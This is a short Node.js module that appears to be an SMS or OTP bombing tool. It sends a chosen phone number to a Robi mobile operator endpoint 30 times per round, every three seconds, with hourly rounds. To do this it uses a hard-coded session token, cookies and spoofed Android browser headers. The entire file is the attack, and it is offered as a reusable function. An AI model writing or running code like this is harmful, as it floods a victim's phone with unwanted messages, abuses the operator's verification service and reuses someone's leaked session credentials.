const axios = require("axios");

async function robi(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const num = number.slice(1);
        const response = await axios.post(
  'https://robi.mife-aoc.com/api/robi/aoc/ask/eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJUUjY3NjIzMjEwODMiLCJleHAiOjE3NTA5OTQwNTR9.WcSI6b0t0u56wE3YGoVDHAolOZSXv6s8btb7MNiVDJ4',
  new URLSearchParams({
    'msisdn': num
  }),
  {
    headers: {
      'authority': 'robi.mife-aoc.com',
      'accept': 'application/json, text/javascript, */*; q=0.01',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'cookie': '_ga=GA1.1.2139022169.1750991565; PLAY_SESSION=ec75b077ab0928989a95a9a7766c5e733e026197-csrfToken=ac4a3e534cabdde1df1c33d81f00cf3294e0c7a8-1750993155649-da53d22e19ca98ae694c441c; _ga_VRYJ6N9CE9=GS2.1.s1750991564$o1$g1$t1750993451$j42$l0$h0',
      'origin': 'https://robi.mife-aoc.com',
      'referer': 'https://robi.mife-aoc.com/robi/aoc/eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJUUjY3NjIzMjEwODMiLCJleHAiOjE3NTA5OTQwNTR9.WcSI6b0t0u56wE3YGoVDHAolOZSXv6s8btb7MNiVDJ4',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
      'x-requested-with': 'XMLHttpRequest'
    }
  }
);
        
        console.log(`[${i + 1}/10] Robi Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Robi Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { robi };
